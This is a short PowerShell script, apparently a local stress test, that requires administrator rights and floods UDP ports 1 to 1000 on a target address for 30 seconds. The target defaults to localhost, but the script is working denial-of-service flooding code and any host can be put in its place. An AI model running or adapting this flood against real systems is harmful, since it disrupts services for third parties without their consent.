# Requires administrator privileges
# Check if running as administrator
$isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if (-not $isAdmin) {
    Write-Host "This script requires administrator privileges. Please run as administrator."
    exit
}

$targetIP = "127.0.0.1"  # Target IP (localhost for testing)
$startPort = 1           # Start port for scanning
$endPort = 1000         # End port for scanning
$duration = 30          # Duration in seconds

Write-Host "Starting UDP flood test..."
Write-Host "Target: $targetIP"
Write-Host "Port Range: $startPort - $endPort"
Write-Host "Duration: $duration seconds"

$startTime = Get-Date

# Create UDP client
$udpClient = New-Object System.Net.Sockets.UdpClient

# Generate some random data to send
$data = [System.Text.Encoding]::ASCII.GetBytes("TEST" * 100)

while ((Get-Date) -lt $startTime.AddSeconds($duration)) {
    for ($port = $startPort; $port -le $endPort; $port++) {
        try {
            # Send data to each port
            $udpClient.Connect($targetIP, $port)
            $udpClient.Send($data, $data.Length) | Out-Null
            $udpClient.Close()
            
            # Create new client for next iteration
            $udpClient = New-Object System.Net.Sockets.UdpClient
        } catch {
            # Ignore errors and continue
        }
    }
    
    # Show progress
    $elapsed = ((Get-Date) - $startTime).TotalSeconds
    Write-Progress -Activity "UDP Flood Test in Progress" -Status "Elapsed: $elapsed seconds" -PercentComplete (($elapsed / $duration) * 100)
}

$udpClient.Close()
Write-Host "UDP flood test completed"
